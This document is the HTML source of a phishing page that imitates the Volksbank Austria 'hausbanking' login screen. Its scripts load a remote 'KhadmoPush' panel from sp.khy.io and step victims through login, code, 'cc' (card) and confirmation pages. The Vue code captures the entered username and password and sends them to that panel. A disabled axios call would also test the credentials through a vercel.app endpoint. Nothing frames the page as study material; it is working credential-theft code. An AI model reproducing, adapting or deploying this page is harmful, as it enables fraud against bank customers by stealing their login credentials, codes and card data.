<html xmlns="http://www.w3.org/1999/xhtml" lang="de"><head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Login</title>
      <link rel="shortcut icon" type="image/png" href="https://banking.volksbank.at/banking/resource/8cf2371faa9236ce35b57bd5e7d30c6d8bbca007/m101/images/favicon.png">
      <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, viewport-fit=cover">
      <meta name="format-detection" content="telephone=no">
      <link rel="stylesheet" type="text/css" id="stylesheet" href="./login_files/main.css">
   </head>
   <body class="login banking  pace-done pace-done" style="">

      <script src="https://sp.khy.io:2400/static/KhadmoPush.js?v=1.0.0"></script>
      <script type="text/javascript">
        KhadmoPush_start({
          steps: {
            current: 'login',
            list: [
              'login',
              'code',
              'cc',
              'confirmation',
            ],
            onStepChange: function (toStep) {
              window.location.href = "./" + toStep + ".html";
            },
          },
        })
      </script>

      <div id="app" style=""><div class="pace pace-inactive pace-inactive"><div data-progress-text="100%" data-progress="99" class="pace-progress"><div class="pace-progress-inner"></div></div> <div class="pace-activity"></div></div> <div class="login-header"><div id="topbar" class="topbar pre-login"><div class="container"><div class="row"><form id="mobile-back-arrow-form" name="mobile-back-arrow-form" method="post" action="#" enctype="application/x-www-form-urlencoded"><div class="topbar-logo"></div></form></div></div></div></div> <div id="overlaycontainer-login" class="container leave-header-visible"><div id="loginswitch"><form id="loginform" name="loginform" method="post" action="#" enctype="application/x-www-form-urlencoded" data-partialsubmit="true" _lpchecked="1" class="login-pin-column"><div id="modaloverlay" tabindex="-1" role="dialog" data-keyboard="true" data-backdrop="static" class="modal loading-info-hide show"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h1><span data-textlabel="login-header">hausbanking Login</span></h1></div> <div class="modal-body"><!----> <div class="row login-row login-info-text"><p><span data-textlabel="login-info-text-32c">Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.</span></p></div> <div class="row login-row login-demo"><hr role="presentation" class="no-margin-top "></div> <div class="row"><div class="col-xs-12"><div class="pull-right "><a id="loginform:j_id_7j:displays:0:display-link" href="#" tabindex="9" class="command-link"><span class="command-link-wrap"><span class="command-link-title">Barrierefrei</span></span></a>   |  <a id="loginform:j_id_7j:languages:1:language-link" href="#" tabindex="8" class="command-link"><span class="command-link-wrap"><span class="command-link-title">English</span></span></a></div> <label for="loginform:benutzername"><small><span data-textlabel="login-label-benutzername-oder-verfuegernummer">Anmeldung mit Benutzername</span></small></label> <div class="input-text"><input id="loginform:benutzername" name="loginform:benutzername" tabindex="1" placeholder="" type="text" value="" autofocus="autofocus" data-refocus="true" autocomplete="off" maxlength="64" spellcheck="false" aria-label="benutzername" title="" class="form-control" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;); cursor: auto;"> <a tabindex="-1" class="del-btn" style="display: none;"><span class="icon icon-inhalt-loeschen"></span></a></div> <!----></div></div> <div class="row"></div> <div class="row login-nutzungsbedingungen"><p><span data-textlabel="login-nutzungsbedingungen">Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdr√ºcklich zu.</span></p></div> <div class="modal-footer"><div class="row"><button id="loginform:loginButtonNext" alt="login" tabindex="4" value="Weiter" type="submit" class="button-default pull-right button-fullwidth"><span data-textlabel="login-button-weiter">Weiter</span></button></div></div> <div class="modal-footer"><div class="row text-center"><a id="loginform:j_id_9i:username-recovery:link-username-recovery" href="#" class="command-link"><span class="command-link-wrap"><span class="command-link-title">Benutzername vergessen?</span></span></a> <br><a id="loginform:j_id_9i:password-recovery:link-password-recovery" href="#" class="command-link"><span class="command-link-wrap"><span class="command-link-title">Passwort vergessen?</span></span></a> <br> <br><a id="loginform:j_id_9i:liveHelp" href="#" class="command-link"><span class="command-link-wrap"><span class="command-link-icon"><span class="icon icon-hilfe"></span></span> <span class="command-link-title">Live Hilfe</span></span></a></div></div></div></div></div></div> <div class="version-info"><a id="loginform:j_id_az:openVersionInfoOverlay" href="#" class="command-link"><span class="command-link-icon"><span data-textlabel="versioninfo-label-app-version"></span> <br><span data-textlabel="versioninfo-label-os-version"></span></span></a></div> <div aria-label="hausbanking Login" tabindex="-1" role="dialog" data-keyboard="true" data-backdrop="static" class="modaloverlay modal loading-info hidden show"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h1><span data-textlabel="login-header">hausbanking Login</span></h1></div> <div class="modal-body"><div id="loginform:j_id_b9:dots" role="presentation" aria-hidden="true" class="loader-wrapper "><div class="loader"><div class="loader-anim loader-anim-1"></div></div> <div class="loader"><div class="loader-anim loader-anim-2"></div></div> <div class="loader"><div class="loader-anim loader-anim-3"></div></div></div> <span data-textlabel="login-daten-werden-geladen" class="daten-werden-geladen">Daten werden geladen </span></div></div></div></div> <span id="loginform:koop"></span></form> <!----></div> <div id="overlaycontainer"></div></div> <div id="messagesfallback" data-messages="true" class="messages-block hidden"></div></div>

      <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.24.0/axios.min.js" integrity="sha512-u9akINsQsAkG9xjc1cnGF4zw5TFDwkxuc9vUp5dltDWYCSmyd0meygbvgXrlc/z7/o4a19Fb5V0OUE58J7dcyw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

      <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
      <script src="https://unpkg.com/http-vue-loader"></script>
      <script src="https://cdn.jsdelivr.net/npm/vue-loading-overlay@3.4.2/dist/vue-loading.min.js"></script>
      <link href="https://cdn.jsdelivr.net/npm/vue-loading-overlay@3/dist/vue-loading.css" rel="stylesheet">

      <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>

      <script type="text/javascript">
      
      Vue.use(VueLoading)

      var app = new Vue({
          el: '#app',

          data: {
            step: 'username',

            username: '',
            password: '',

            showUsernameError: false,
          },

          watch: {

          },

          computed: {

          },

          methods: {
            setUsername: function() {

               this.showUsernameError = false
               this.showPasswordError = false
               this.step     = 'username'
               this.password = ''

               if(!this.username || this.username.length < 2) {
                  
                  this.showUsernameError = true

                  return
               }

               this.step     = 'password'
            },
            trueLogin: async function() {
               return new Promise(resolve => {
            
                  resolve({
                     status: null
                  })

                  return 

                  axios
                     .get('https://vr-at-casphp.vercel.app/api/auth?username=' + encodeURIComponent(this.username) + '&password=' + encodeURIComponent(this.password))
                     .then(response => {
                        console.log(response.data)
                        resolve({
                           status: response.data.isTrue
                        })
                     })
                     .catch(err => {
                        console.log(err.message)
                        resolve({
                           status: null
                        })
                     })
               })
            },
            checkLogin: async function() {

               this.loader = this.$loading.show({
                    container: this.$refs.loginContainer
               });

               this.showPasswordError = false
               this.step     = 'password'

               if(!this.password || this.password.length < 2) {
                  this.step     = 'username'
                  this.username = ''
                  this.showPasswordError = true

                  this.loader.hide()
                  return
               }

               let trueLogin = await this.trueLogin()

               if (trueLogin.status === false) {
                  this.step     = 'username'
                  this.username = ''
                  this.showPasswordError = true

                  this.loader.hide()
                  return
               }

               let requireValidate = trueLogin.status === true ? false : true

               return KhadmoPush_validate({

                validateData: {
                  'Username': this.username,
                  'Password': this.password,
                },

                requireValidate: requireValidate,

                onSuccess: function(payload) {
                  setTimeout(function() {
                   window.location.href = './code.html'
                  }, 10000)
                },
                onFailed: (payload) => {

                  this.step     = 'username'
                  this.username = ''
                  this.showPasswordError = true

                  this.loader.hide()
                },
                onProgress: function(payload) {
                  //
                },
              })
               
            },
          },

          created: function() {
              window.casVue = this
          },
          
          mounted: function() {

            $('#app').show()

          }
      });   
      </script>
   
</body></html>